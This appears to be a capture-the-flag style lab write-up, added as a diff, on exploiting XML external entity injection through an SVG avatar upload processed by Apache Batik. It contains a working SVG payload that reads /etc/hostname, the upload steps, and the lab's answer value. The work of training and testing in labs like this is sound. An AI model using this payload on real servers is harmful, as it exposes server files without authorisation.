@@ -1,0 +1,23 @@
+// Lab: Exploiting XXE via image file upload
+
+This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
+To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.
+
+
+
+// Solution
+
+
+1. Create a avatar.svg file in your desktop and inject the follwing payload inside it:
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+
+2. Now Go to blog and comment down with name, email, website and upload avatar.svg in the upload file option
+
+3. Now after submit, go back to the comment section check your comment, open the image in new tab and note the
+   given values:
+
+   eaa155b6a2cb 
+
+4. Submit the value in submit answer and solved the lab.
